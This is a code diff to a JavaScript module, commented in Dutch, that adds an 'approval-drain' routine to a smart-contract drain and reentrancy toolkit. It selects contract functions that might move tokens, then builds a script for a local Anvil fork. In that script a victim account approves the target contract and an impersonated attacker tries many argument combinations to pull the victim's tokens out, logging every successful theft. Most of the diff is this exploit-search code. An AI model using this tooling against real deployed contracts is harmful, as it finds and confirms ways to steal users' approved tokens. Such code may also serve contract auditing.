@@ -195,14 +195,81 @@ function buildReentrancyScript(targets, deposits, tokens) {
   `;
 }
 
+// Minimale mintbare test-ERC20 (creation bytecode, solc 0.8.20) voor approval-drain test.
+const TEST_TOKEN_BYTECODE = '0x608060405234801561000f575f80fd5b506103ad8061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610060575f3560e01c8063095ea7b31461006457806323b872dd1461008c57806340c10f191461009f57806370a08231146100b4578063a9059cbb146100e1578063dd62ed3e146100f4575b5f80fd5b61007761007236600461028b565b61011e565b60405190151581526020015b60405180910390f35b61007761009a3660046102b3565b61014b565b6100b26100ad36600461028b565b6101e6565b005b6100d36100c23660046102ec565b5f6020819052908152604090205481565b604051908152602001610083565b6100776100ef36600461028b565b610216565b6100d361010236600461030c565b600160209081525f928352604080842090915290825290205481565b335f9081526001602081815260408084206001600160a01b03871685529091529091208290555b92915050565b6001600160a01b0383165f90815260016020908152604080832033845290915281208054839190839061017f908490610351565b90915550506001600160a01b0384165f90815260208190526040812080548492906101ab908490610351565b90915550506001600160a01b0383165f90815260208190526040812080548492906101d7908490610364565b90915550600195945050505050565b6001600160a01b0382165f908152602081905260408120805483929061020d908490610364565b90915550505050565b335f90815260208190526040812080548391908390610236908490610351565b90915550506001600160a01b0383165f9081526020819052604081208054849290610262908490610364565b909155506001949350505050565b80356001600160a01b0381168114610286575f80fd5b919050565b5f806040838503121561029c575f80fd5b6102a583610270565b946020939093013593505050565b5f805f606084860312156102c5575f80fd5b6102ce84610270565b92506102dc60208501610270565b9150604084013590509250925092565b5f602082840312156102fc575f80fd5b61030582610270565b9392505050565b5f806040838503121561031d575f80fd5b61032683610270565b915061033460208401610270565b90509250929050565b634e487b7160e01b5f52601160045260245ffd5b818103818111156101455761014561033d565b808201808211156101455761014561033d56fea2646970667358221220ba33ef64654bd967e4de37caf3b8b7a54a0fb1150861339966799193e0f2110464736f6c63430008140033';
+
+// Kandidaten voor approval-drain: functies met >=2 address-args (mogelijk token/from/to) of door Slither geflagd.
+function pickApprovalCandidates(abi, slitherFindings) {
+  if (!Array.isArray(abi)) return [];
+  const slFns = new Set((slitherFindings || []).filter(f => /arbitrary-send-erc20/.test(f.check || '')).map(f => ((f.description || '').match(/\.(\w+)\s*\(/) || [])[1]).filter(Boolean));
+  const out = [];
+  for (const item of abi) {
+    if (item.type !== 'function' || ['view', 'pure'].includes(item.stateMutability)) continue;
+    const inputs = item.inputs || [];
+    if (inputs.length === 0 || inputs.length > 4) continue;
+    if (!inputs.every(i => /^(uint\d*|int\d*|address|bool)$/.test(i.type))) continue;
+    const addrCount = inputs.filter(i => i.type === 'address').length;
+    if (slFns.has(item.name) || addrCount >= 2) out.push({ name: item.name, types: inputs.map(i => i.type), sig: `${item.name}(${inputs.map(i => i.type).join(',')})` });
+  }
+  const seen = new Set();
+  return out.filter(c => !seen.has(c.sig) && seen.add(c.sig)).slice(0, 20);
+}
+
+// Approval-drain fork-script: slachtoffer approved TARGET, aanvaller probeert via transferFrom te stelen.
+function buildApprovalDrainScript(candidates) {
+  return `
+  const EOA = '0x1111111111111111111111111111111111111111';
+  const VICTIM = '0x2222222222222222222222222222222222222222';
+  const ATTACKER = '0x3333333333333333333333333333333333333333';
+  for (const x of [EOA, VICTIM, ATTACKER]) { await fund(x); await provider.send('anvil_impersonateAccount', [x]); }
+  const eoaS = await impersonate(EOA);
+  const AMT = 10n ** 21n;
+  const tokenF = new ethers.ContractFactory(['function mint(address,uint)','function balanceOf(address) view returns(uint)','function approve(address,uint) returns(bool)'], '${TEST_TOKEN_BYTECODE}', eoaS);
+  const token = await tokenF.deploy(); await token.waitForDeployment(); const TT = await token.getAddress();
+  await (await token.mint(VICTIM, AMT)).wait();
+  const victimS = await impersonate(VICTIM);
+  await (await new ethers.Contract(TT, ['function approve(address,uint) returns(bool)'], victimS).approve(TARGET, ethers.MaxUint256)).wait();
+  const attS = await impersonate(ATTACKER);
+  const tokenView = new ethers.Contract(TT, ['function balanceOf(address) view returns(uint)'], provider);
+  const CANDS = ${JSON.stringify(candidates)};
+
+  function perms(types) {
+    let combos = [[]];
+    for (const t of types) {
+      const opts = t === 'address' ? [TT, VICTIM, ATTACKER] : (/^(uint|int)/.test(t) ? [AMT] : (t === 'bool' ? [false] : [0]));
+      const next = []; for (const c of combos) for (const o of opts) { if (next.length < 18) next.push([...c, o]); } combos = next;
+    }
+    return combos;
+  }
+
+  let drains = 0;
+  for (const c of CANDS) {
+    const iface = new ethers.Contract(TARGET, ['function ' + c.sig], attS);
+    let hit = false;
+    for (const args of perms(c.types)) {
+      const snap = await provider.send('evm_snapshot', []);
+      try {
+        const before = await tokenView.balanceOf(ATTACKER);
+        await iface[c.name](...args, { gasLimit: 3000000 });
+        const after = await tokenView.balanceOf(ATTACKER);
+        if (after > before) { console.log('[APPROVAL-DRAIN] ' + c.name + ' | TOKEN | ' + ethers.formatUnits(after - before, 18)); drains++; hit = true; }
+      } catch (e) {}
+      await provider.send('evm_revert', [snap]);
+      if (hit) break;
+    }
+  }
+  console.log('[APPROVAL-DONE] ' + CANDS.length + ' functies, ' + drains + ' drains');
+  `;
+}
+
 // Parse output van runOnAnvilFork -> lijst drains
 function parseDrains(output) {
   const drains = [];
   for (const line of (output || '').split('\n')) {
-    const m = line.match(/\[(?:DRAIN|REENTRANCY-DRAIN)\]\s*([\w+]+)\s*\|\s*(\w+)\s*\|\s*([\d.]+)/);
-    if (m) drains.push({ fn: m[1], token: m[2], amount: parseFloat(m[3]), reentrancy: line.includes('REENTRANCY') });
+    const m = line.match(/\[(?:DRAIN|REENTRANCY-DRAIN|APPROVAL-DRAIN)\]\s*([\w+]+)\s*\|\s*(\w+)\s*\|\s*([\d.]+)/);
+    if (m) drains.push({ fn: m[1], token: m[2], amount: parseFloat(m[3]), reentrancy: line.includes('REENTRANCY'), approval: line.includes('APPROVAL') });
   }
   return drains;
 }
 
-module.exports = { pickDrainCandidates, pickDepositCandidates, pickReentrancyTargets, buildDrainScript, buildReentrancyScript, parseDrains, DRAIN_NAME_RE };
+module.exports = { pickDrainCandidates, pickDepositCandidates, pickReentrancyTargets, pickApprovalCandidates, buildDrainScript, buildReentrancyScript, buildApprovalDrainScript, parseDrains, DRAIN_NAME_RE };
